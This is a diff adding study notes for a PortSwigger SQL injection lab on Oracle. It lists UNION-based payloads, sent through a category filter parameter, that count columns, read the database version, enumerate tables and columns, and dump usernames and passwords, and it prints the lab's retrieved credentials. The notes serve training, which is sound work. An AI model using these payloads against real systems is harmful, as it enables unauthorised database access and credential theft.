@@ -2,6 +2,37 @@ SQLi attack listing the database contents on Oracle
 https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database
 https://ranakhalil.teachable.com/courses/1491236/lectures/34259889
 
+Goal: Retrieve the contents of the table to obtain the username and password of all users.
+
 Steps:
+------
+1) Determine the number of columns using: '+Order+By+1-- 
+2) Determine the column types by using: '+UNION+SELECT+'a',NULL--
+3) Determine the database version: '+UNION+SELECT,@@version(),NULL--  (Look at cheatsheet for the different syntax for version command)
+4) Retrieve database table name for users
+5) Retrieve table column of the users table.
+6) Retrieve the username and password of all users.
 
 Analysis:
+---------
+1) Number of columns: 2
+    - /filter?category=Tech+gifts'+Order+By+3-- (3 Failed so number of columns = n-1)
+
+2) Determine column Types: string,string
+    - Note that Oracle queries always require 'from dual'
+    - /filter?category=Tech+gifts'+UNION+SELECT+'a','a'+FROM+dual--
+
+3) Determine database version: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+    - /filter?category=Tech+gifts'+UNION+SELECT+banner,NULL+FROM+v$version--
+
+4) Retrieve database table name for users: USERS_GFYGVC
+    - /filter?category=Tech+gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+
+5) Retrieve table columns for USERS_GFYGVC table: USERNAME_REJCBD, PASSWORD_WKMPFV
+    - /filter?category=Tech+gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_GFYGVC'--
+
+6) Retrieve all username and passwords: 
+* administrator | fzxjdhumn8c14qnh5i9w
+* carlos | 60eos8o8pvozztsu9ied
+* wiener | rjtf4jtb5ncm6wz9iftj
+    - /filter?category=Tech+gifts'+UNION+SELECT+USERNAME_REJCBD,PASSWORD_WKMPFV+FROM+USERS_GFYGVC--
